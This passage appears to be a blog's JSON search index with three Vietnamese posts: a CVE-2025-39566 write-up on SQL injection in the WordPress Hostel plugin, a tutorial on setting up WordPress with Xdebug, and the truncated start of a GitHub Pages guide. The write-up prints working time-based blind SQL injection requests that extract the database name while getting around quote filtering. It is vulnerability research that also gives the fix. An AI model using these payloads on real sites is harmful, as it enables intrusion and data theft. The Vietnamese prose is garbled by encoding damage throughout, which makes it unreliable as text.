c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi 